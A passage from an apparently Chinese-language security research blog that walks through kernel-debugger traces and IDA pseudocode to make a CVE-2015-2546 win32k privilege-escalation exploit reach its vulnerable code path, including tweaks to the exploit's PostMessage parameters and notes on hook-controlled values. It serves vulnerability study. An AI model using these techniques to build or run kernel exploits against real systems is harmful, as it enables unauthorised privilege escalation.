+90668f9d&nbsp;0f8706010000&nbsp;&nbsp;&nbsp;&nbsp;ja&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxHandleMenuMessages+0x330&nbsp;(906690a9)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这时我们看一下我这篇文章开头提到的HandleMenuMessages函数的分析，在开头有两处if语句判断，正是和这两个值做的比较，接下来经过一系列判断跳转之后，我们就到达了MNMouseMove的调用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x264:
+90668fdd&nbsp;a900040000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,400h
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x269:
+90668fe2&nbsp;747a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxHandleMenuMessages+0x2e5&nbsp;(9066905e)
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x2e5:
+9066905e&nbsp;53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">9066905e地址所处的位置，已经是MNMouseMove的上方，ebx正在作为MNMouseMove的参数传入栈中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">.text:BF93905E&nbsp;;&nbsp;395:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xxxMNMouseMove(v3,&nbsp;a2,&nbsp;(int)v7);
+.text:BF93905E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;int
+.text:BF93905F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;int
+.text:BF939060&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;UnicodeString
+.text:BF939061&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;_xxxMNMouseMove@12&nbsp;;&nbsp;xxxMNMouseMove(x,x,x)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">也就是说，之前传入的这个eax是一个很关键的值，如果弄明白这个值，就可以让程序成功执行到MNMouseMove了，但因为这个过程实际上是通过Windows下的图形界面操作（也就是鼠标在我们创建的主窗口移动产生的），所以我们并不能通过CVE-2014-4113的源码分析出来，这里需要分析一下这个值得内容，这时我想到了CVE-2014-4113源程序，同样也是在HandleMenuMessages进行if语句的判断导致跳转，而CVE-2014-4113已经分析的很清楚了，运行CVE-2014-4113的源程序，中断在HandleMenuMessage调试。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x19:
+90668d91&nbsp;53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x1a:
+90668d92&nbsp;56&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;esi
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x1b:
+90668d93&nbsp;8b7508&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,dword&nbsp;ptr&nbsp;[ebp+8]
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x1e:
+90668d96&nbsp;8b4604&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[esi+4]
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x21:
+90668d99&nbsp;8b5608&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,dword&nbsp;ptr&nbsp;[esi+8]
+kd&gt;&nbsp;r&nbsp;eax
+eax=00000201
+kd&gt;&nbsp;dd&nbsp;esi
+85c4bb0c&nbsp;&nbsp;000f02a2&nbsp;00000201&nbsp;00000000&nbsp;00000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看到这里eax的值是0x201（刚才那个是0x200），也就是十进制的513，来看一下CVE-2014-4113里的过程，计算一下。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;v20&nbsp;=&nbsp;v5&nbsp;-&nbsp;261;
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v20&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v21&nbsp;=&nbsp;v20&nbsp;-&nbsp;1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v21&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v22&nbsp;=&nbsp;v21&nbsp;-&nbsp;18;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v22&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v23&nbsp;=&nbsp;v22&nbsp;-&nbsp;232;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v23&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v23&nbsp;==&nbsp;1&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+LABEL_13:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v12&nbsp;=&nbsp;a2;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(a2&nbsp;+&nbsp;16)&nbsp;=&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(a2&nbsp;+&nbsp;8)&nbsp;=&nbsp;(signed&nbsp;__int16)v7;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(a2&nbsp;+&nbsp;12)&nbsp;=&nbsp;SHIWORD(v7);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;xxxMNFindWindowFromPoint(v3,&nbsp;(int)&amp;UnicodeString,&nbsp;(int)v7);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v52&nbsp;=&nbsp;IsMFMWFPWindow(v13);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里要计算最后v23的值，就从最上方v20的值开始向下判断，也就是v23=513-261-1-18-232=1，正好v23等于1，从而进入下面CVE-2014-4113的处理逻辑。v5的值，就是0x201，也就是513，那么这个值到底是什么呢，我们来查一下这个值。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">public&nbsp;enum&nbsp;WMessages&nbsp;:&nbsp;int
+&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WM_LBUTTONDOWN&nbsp;=&nbsp;0x201,&nbsp;//Left&nbsp;mousebutton&nbsp;down
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WM_LBUTTONUP&nbsp;=&nbsp;0x202,&nbsp;&nbsp;//Left&nbsp;mousebutton&nbsp;up
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WM_LBUTTONDBLCLK&nbsp;=&nbsp;0x203,&nbsp;//Left&nbsp;mousebutton&nbsp;doubleclick
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WM_RBUTTONDOWN&nbsp;=&nbsp;0x204,&nbsp;//Right&nbsp;mousebutton&nbsp;down
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WM_RBUTTONUP&nbsp;=&nbsp;0x205,&nbsp;&nbsp;&nbsp;//Right&nbsp;mousebutton&nbsp;up
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WM_RBUTTONDBLCLK&nbsp;=&nbsp;0x206,&nbsp;//Right&nbsp;mousebutton&nbsp;doubleclick
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WM_KEYDOWN&nbsp;=&nbsp;0x100,&nbsp;&nbsp;//Key&nbsp;down
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WM_KEYUP&nbsp;=&nbsp;0x101,&nbsp;&nbsp;&nbsp;//Key&nbsp;up
+&nbsp;&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">原来这个值就是WM_LBUTTONDOWN的值，正是CVE-2014-4113利用程序中MyWndProc中其中第三个PostMessage中调用到的第二个参数值，所以，我在这里，将我的Exploit中的PostMessage里第二个参数直接修改成0x200，重新运行程序，终于命中了MNMouseMove断点。接下来可以进入内层函数分析了。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t012874fb9048c86755.png" title="t015281883afb934268.png" alt="http://p2.qhimg.com/t015281883afb934268.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">进入内层函数后，我们需要想办法让程序执行到MNFindeWindowFromPoint函数调用的位置，但是我发现到其中一个判断的时候没法通过，会直接到退出的位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x2f:
+9066941e&nbsp;0f846f010000&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNMouseMove+0x1a4&nbsp;(90669593)
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x1a4:
+90669593&nbsp;5f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">来看一下IDA pro的伪代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">if&nbsp;(&nbsp;(signed&nbsp;__int16)a3&nbsp;!=&nbsp;*(_DWORD&nbsp;*)(a2&nbsp;+&nbsp;8)&nbsp;||&nbsp;SHIWORD(a3)&nbsp;!=&nbsp;*(_DWORD&nbsp;*)(a2&nbsp;+&nbsp;12)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;{</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">只有上面伪代码中的if语句判断通过后，才能进入到漏洞的处理流程，动态跟踪一下这个过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x26:
+90669415&nbsp;c1ea10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,10h
+kd&gt;&nbsp;r&nbsp;edx
+edx=00000000
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x29:
+90669418&nbsp;0fbfd2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movsx&nbsp;&nbsp;&nbsp;edx,dx
+kd&gt;&nbsp;r&nbsp;edx
+edx=00000000
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x2c:
+9066941b&nbsp;3b570c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,dword&nbsp;ptr&nbsp;[edi+0Ch]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这最主要的原因就是对比的两个值都为0，从而不满足if语句的跳转，跳过了漏洞处理所需的逻辑流程，但是在我们利用鼠标移动的时候，却发现这个流程可以进入if语句判断。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x2e8:
+90669061&nbsp;e889030000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNMouseMove&nbsp;(906693ef)
+kd&gt;&nbsp;dd&nbsp;esp
+85c47a98&nbsp;&nbsp;fde8da68&nbsp;9074f580&nbsp;000f0059&nbsp;9074f580&nbsp;//000f0059
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x18:
+90669407&nbsp;0fbfc1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movsx&nbsp;&nbsp;&nbsp;eax,cx
+kd&gt;&nbsp;r&nbsp;ecx
+ecx=000f0059
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x1b:
+9066940a&nbsp;57&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x1c:
+9066940b&nbsp;8b7d0c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,dword&nbsp;ptr&nbsp;[ebp+0Ch]
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x1f:
+9066940e&nbsp;3b4708&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[edi+8]
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x22:
+90669411&nbsp;7511&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNMouseMove+0x35&nbsp;(90669424)
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x35:
+90669424&nbsp;894708&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[edi+8],eax
+kd&gt;&nbsp;r&nbsp;eax
+eax=00000059</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">鼠标移动的情况下，eax的值是0x59，并非0x00，那么这个值从哪里来呢，在进入MNMouseMove前看一下参数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x2e8:
+90669061&nbsp;e889030000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNMouseMove&nbsp;(906693ef)
+kd&gt;&nbsp;dd&nbsp;esp
+85c47a98&nbsp;&nbsp;fde8da68&nbsp;9074f580&nbsp;000f0059&nbsp;9074f580</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过IDA pro分析一下HandleMenuMessages函数，看看这个值是从哪里来。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">v5&nbsp;=&nbsp;*(_DWORD&nbsp;*)(a1&nbsp;+&nbsp;4);
+v6&nbsp;=&nbsp;*(_DWORD&nbsp;*)(a1&nbsp;+&nbsp;8);
+v7&nbsp;=&nbsp;*(void&nbsp;**)(a1&nbsp;+&nbsp;12);
+xxxMNMouseMove(v3,&nbsp;a2,&nbsp;(int)v7);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">是a1，也就是HandleMenuMessages的第一个参数，这样我们可以回到CVE-2014-4113中，在调用HandleMenuMessages的时候，直接查看第一个参数偏移+0Ch位置的值，看看这个值是不是由我们决定的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x1e:
+90668d96&nbsp;8b4604&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[esi+4]
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x21:
+90668d99&nbsp;8b5608&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,dword&nbsp;ptr&nbsp;[esi+8]
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x24:
+90668d9c&nbsp;8b5e0c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx,dword&nbsp;ptr&nbsp;[esi+0Ch]
+kd&gt;&nbsp;r&nbsp;edx
+edx=00000000
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x27:
+90668d9f&nbsp;b904010000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,104h
+kd&gt;&nbsp;r&nbsp;ebx
+ebx=00000000
+kd&gt;&nbsp;r&nbsp;eax
+eax=00000201</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看到ebx寄存器是esi+0ch的值，这个值是0，eax的值是0x201，回过头看一下正常Exploit中MyWndProc函数的PostMessages的参数调用。</span></p><pre class="brush:bash;toolbar:false">PostMessage(hwnd,WM_LBUTTONDOWN,0x00,0)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个第三个第四个特定参数都是0x00，那么我觉得这个可能和MNMouseMove中的值有关，于是我尝试修改了CVE-2015-2546中PostMessage消息传递的特定参数。</span><br/><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">修改之后，我们重新跟踪调试。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x21:
+90668d99&nbsp;8b5608&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,dword&nbsp;ptr&nbsp;[esi+8]
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x24:
+90668d9c&nbsp;8b5e0c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx,dword&nbsp;ptr&nbsp;[esi+0Ch]
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x27:
+90668d9f&nbsp;b904010000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,104h
+kd&gt;&nbsp;r&nbsp;edx
+edx=00110011
+kd&gt;&nbsp;r&nbsp;ebx
+ebx=00110011</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">果然这个值可控了，而且esi指针的值就+4h是PostMessage第二个参数，+08h是第三个参数，+0Ch是第四个参数，接下来，MNMouseMove也能够正常进入if语句的处理流程了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x2e8:
+90669061&nbsp;e889030000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNMouseMove&nbsp;(906693ef)
+kd&gt;&nbsp;dd&nbsp;esp
+85d07a98&nbsp;&nbsp;fde8da68&nbsp;9074f580&nbsp;00110011&nbsp;9074f580
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x1f:
+9066940e&nbsp;3b4708&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[edi+8]
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x22:
+90669411&nbsp;7511&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNMouseMove+0x35&nbsp;(90669424)
+kd&gt;&nbsp;r&nbsp;eax
+eax=00000011
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x35:
+90669424&nbsp;894708&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[edi+8],eax</pre><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><strong style="font-size: 18px; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在HOOK中挣扎和Exploit</span></strong><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">接下来，进入到消息钩子部分，主要处理的还是SendMessage异步处理时的消息，通过修改返回，最后达到漏洞调用位置，通过IDA pro来跟踪一下MNMouseMove的执行流程，以及跟CVE-2015-2546有关的部分。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">void&nbsp;__stdcall&nbsp;xxxMNMouseMove(WCHAR&nbsp;UnicodeString,&nbsp;int&nbsp;a2,&nbsp;int&nbsp;a3)
+{
+&nbsp;&nbsp;……
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;(signed&nbsp;__int16)a3&nbsp;!=&nbsp;*(_DWORD&nbsp;*)(a2&nbsp;+&nbsp;8)&nbsp;||&nbsp;SHIWORD(a3)&nbsp;!=&nbsp;*(_DWORD&nbsp;*)(a2&nbsp;+&nbsp;12)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(a2&nbsp;+&nbsp;8)&nbsp;=&nbsp;(signed&nbsp;__int16)a3;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(v5&nbsp;+&nbsp;12)&nbsp;=&nbsp;SHIWORD(v4);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v6&nbsp;=&nbsp;xxxMNFindWindowFromPoint(v3,&nbsp;(int)&amp;UnicodeString,&nbsp;v4);//&nbsp;V6通过HOOK可控，这里的sendmessage是异步处理
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v7&nbsp;=&nbsp;v6;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;v7可控
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……
